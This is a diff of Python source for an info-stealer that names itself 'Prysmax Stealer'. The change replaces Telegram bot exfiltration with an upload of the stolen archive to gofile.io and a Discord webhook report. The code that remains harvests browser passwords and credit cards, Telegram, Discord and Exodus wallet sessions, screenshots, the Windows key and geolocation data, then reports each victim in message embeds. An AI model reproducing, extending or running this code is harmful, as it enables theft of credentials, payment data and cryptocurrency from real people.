@@ -1,20 +1,16 @@
 import os, requests, json, base64, sqlite3, shutil, uuid, wmi, psutil, subprocess, glob, re
 import platform as platform_module
+from discord_webhook import DiscordEmbed, DiscordWebhook
 
 from PIL import ImageGrab
 from zipfile import ZipFile
-from telegram import InputFile
 
 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from datetime import datetime
-from telegram import Bot
 
-prysmax = "token-here"
-chat_id = "chat-id"
-
-bot = Bot(token=prysmax)
+theapi2023 = "Here-Token"
 
 appdata = os.getenv('LOCALAPPDATA')
 user = os.path.expanduser("~")
@@ -259,11 +255,12 @@ for browser in available_browsers:
         save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
         
         shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')
-if not os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax'):
+try:
+ if not os.path.exists(user+'\\AppData\\Local\\Temp\\Prysmax'):
     os.mkdir(user+'\\AppData\\Local\\Temp\\Prysmax')
-shutil.move(user+'\\AppData\\Local\\Temp\\Browser.zip', user+'\\AppData\\Local\\Temp\\Prysmax')
-
-import os
+ shutil.move(user+'\\AppData\\Local\\Temp\\Browser.zip', user+'\\AppData\\Local\\Temp\\Prysmax')
+except:
+    pass
 
 def find_antivirus_folders(base_folder):
     antivirus_names = [
@@ -530,52 +527,76 @@ def machine_info():
      screenshot = True
     except:
         screenshot = False
-    pc_stolen = f"""
-          Prysmax Stealer - New Victim ⚠️
-  
-    ╔
-    ╠       Network Info🌐                 
-    ╠  ╒  IP: {theip}
-    ╠   ╒  Country: {ip_country}
-    ╠    ╒  Region: {ip_region}
-    ╠      ╒  City: {ip_city}
-    ╠       ╒  Vpn: {ip_proxy}
-    ╠         ╒  ISP: {ip_isp}
-    ╠
-    
-    ╠     Machine Info 🖥 
-    ╠  ╒ Pc Name: {pc_name}
-    ╠    ╒ OS: {pc_os}
-    ╠     ╒ CPU: {pc_cpu}
-    ╠      ╒ HWID: {pc_hwid}
-    ╠       ╒ RAM: {pc_ram}
-    ╠        ╒ GPU: {pc_gpu}
-    ╠         ╒ Windows Key: {pc_key}
-               ╒ Antiviruses: {antivirus_name}
 
-    ╠    Sessions - 💶
-    
-    ╠   Telegram: {telegram}
-    
-    ╠   Discord: {Discord}
-    
-    ╠   Browsers Files: {total_browsers}
-    
-    ╠   Exodus: {exodus}
-
-    ╠   Screenshot: {screenshot}
-    
-    ╠   Process Running: {num_procesos}
-    """  
     temp_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp')
 
     folder_to_compress = os.path.join(temp_folder, 'Prysmax')
 
     zip_name = os.path.join(temp_folder, 'Prysmax')
-
     shutil.make_archive(zip_name, 'zip', folder_to_compress)
-    bot.send_message(chat_id=chat_id, text=pc_stolen)
-    file_path = user + '\\AppData\\Local\\Temp\\Prysmax.zip'
-    with open(file_path, 'rb') as file:
-        bot.send_document(chat_id=chat_id, document=InputFile(file))
+        
+        
+    response = requests.get('https://api.gofile.io/getServer')
+    data = response.json()
+    server = data['data']['server']  # Extracting the server name from the response
+
+    upload_url = f'https://{server}.gofile.io/uploadFile'  # Construct the upload URL
+    
+    filex = user + '\\AppData\\Local\\Temp\\Prysmax.zip'
+    
+    with open(filex, 'rb') as f:
+        files = {'file': ('Prysmax.zip', f)}
+        upload_response = requests.post(upload_url, files=files)
+        uploadth = upload_response.json()  # Convert response to JSON after checking status
+        link_download = uploadth["data"]["downloadPage"]
+    wh = DiscordWebhook(url=theapi2023, username="Prysmax Software", avatar_url="https://i.imgur.com/rKRyGlx.jpeg")
+
+    embed = DiscordEmbed(title='Prysmax Stealer', description='The new Generation', color=0x040101)
+
+    # Add embed author, thumbnail, fields, and footer
+    embed.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/rKRyGlx.jpeg')
+    embed.set_thumbnail(url='https://i.imgur.com/ntz643t.jpeg')
+    embed.add_embed_field(name='🖤 IP', value=f'{theip}')
+    embed.add_embed_field(name='🖤 Country', value=f'{ip_country}')
+    embed.add_embed_field(name='🖤 Region', value=f'{ip_region}')
+    embed.add_embed_field(name='🖤 City', value=f'{ip_city}')
+    embed.add_embed_field(name='🖤 VPN', value=f'{ip_proxy}')
+
+    embed.set_footer(text='t.me/lawxsz')
+
+    embed2 = DiscordEmbed(title='Prysmax Stealer', description='The new Generation', color=0x040101)
+
+    # Add embed author, thumbnail, fields, and footer
+    embed2.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/rKRyGlx.jpeg')
+    embed2.set_thumbnail(url='https://i.imgur.com/ntz643t.jpeg')
+    embed2.add_embed_field(name='​🖤​ PC Name', value=f'{pc_name}')
+    embed2.add_embed_field(name='​🖤​ OS', value=f'{pc_os}')
+    embed2.add_embed_field(name='​🖤​ CPU', value=f'{pc_cpu}')
+    embed2.add_embed_field(name='​🖤​ HWID', value=f'{pc_hwid}')
+    embed2.add_embed_field(name='​🖤​ RAM', value=f'{pc_ram}')
+    embed2.add_embed_field(name='​🖤​ GPU', value=f'{pc_gpu}')
+    embed2.add_embed_field(name='​🖤​ Windows Key', value=f'{pc_key}')
+    embed2.add_embed_field(name=f'​🖤​ Antivirus: {antivirus_name}', value='')
+    embed2.set_footer(text='t.me/lawxsz')
+
+    embed3 = DiscordEmbed(title='Prysmax Stealer', description='The new Generation', color=0x040101)
+
+    # Add embed author, thumbnail, fields, and footer
+    embed3.set_author(name='github.com/lawxsz/prysmax', icon_url='https://i.imgur.com/rKRyGlx.jpeg')
+    embed3.set_thumbnail(url='https://i.imgur.com/ntz643t.jpeg')
+    embed3.add_embed_field(name='​🖤​ Telegram', value=f'{telegram}')
+    embed3.add_embed_field(name='​🖤​ Discord', value=f'{Discord}')
+    embed3.add_embed_field(name='​🖤​ Browsers Files', value=f'{total_browsers}')
+    embed3.add_embed_field(name='​🖤​ Exodus', value=f'{exodus}')
+    embed3.add_embed_field(name='​🖤​ Screenshot', value=f'{screenshot}')
+    embed3.add_embed_field(name='​🖤​ Total Process', value=f'{num_procesos}')
+    embed3.add_embed_field(name='​🖤​ Download Files', value=f'{link_download}')
+
+    embed3.set_footer(text='t.me/lawxsz')
+    wh.add_embed(embed)
+    wh.add_embed(embed2)
+    wh.add_embed(embed3)
+
+    response = wh.execute()
+
 machine_info()
